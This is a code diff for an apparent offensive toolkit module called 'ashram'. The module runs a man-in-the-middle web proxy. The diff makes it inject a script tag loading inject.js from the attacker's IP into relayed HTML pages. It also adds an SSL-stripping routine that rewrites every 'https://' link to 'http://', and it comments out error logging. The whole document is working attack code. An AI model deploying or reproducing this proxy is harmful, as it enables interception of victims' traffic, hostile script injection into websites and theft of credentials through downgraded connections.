@@ -1,6 +1,18 @@
 this.prefix = 'ashram';
 this.call = function(args, mh) {
   var ashramport = 1337;
+  function replaceAll(str, find, replace) {
+    var i = str.indexOf(find);
+    if (i > -1){
+      str = str.replace(find, replace);
+      i = i + replace.length;
+      var st2 = str.substring(i);
+      if(st2.indexOf(find) > -1){
+        str = str.substring(0,i) + replaceAll(st2, find, replace);
+      }
+    }
+    return str;
+  }
   if(args.length == 2) {
     var http = mh.require('http');
     var request = mh.require('request');
@@ -27,11 +39,27 @@ this.call = function(args, mh) {
               });
             }
             if(req.headers.accept.search('text/html') != -1) {
-              mh.clog('[AshRam] Injecting into: '.green + req.url);
               var reqgeterror = request.get(req.url, function(err,resget,body){
                 if(resget) {
-                  res.writeHead(resget.statusCode, resget.headers);
-                  res.end("<script src='"+ mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + body);
+                  if(resget.headers['content-type'].search('text/html') != -1) {
+                    mh.clog('[AshRam] Injecting into: '.green + req.url);
+                    res.writeHead(resget.statusCode, resget.headers);
+                    res.end("<script src='"+ mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + replaceAll(body, "https://", "http://"));
+                  } else {
+                    req.pause();
+                    var options = url.parse(req.url);
+                    options.headers = req.headers;
+                    options.method = req.method;
+                    options.agent = false;
+                    var connector = http.request(options, function(serverResponse) {
+                      serverResponse.pause();
+                      res.writeHeader(serverResponse.statusCode, serverResponse.headers);
+                      serverResponse.pipe(res);
+                      serverResponse.resume();
+                    });
+                    req.pipe(connector);
+                    req.resume();
+                  }
                 } else {
                   res.end("error");
                 }
@@ -55,7 +83,7 @@ this.call = function(args, mh) {
               req.resume();
             }
           } catch(err) {
-            mh.clog('[AshRam] '.red + err.toString().red);
+            //mh.clog('[AshRam] '.red + err.toString().red);
           }
         }));
         mh.varRet('ashramproxy').on('connect', function(req, cltSocket, head) {
@@ -79,7 +107,7 @@ this.call = function(args, mh) {
 
             });
           } catch(err) {
-            mh.clog('[AshRam] '.red + err.red);
+            //mh.clog('[AshRam] '.red + err.red);
           }
         });
 
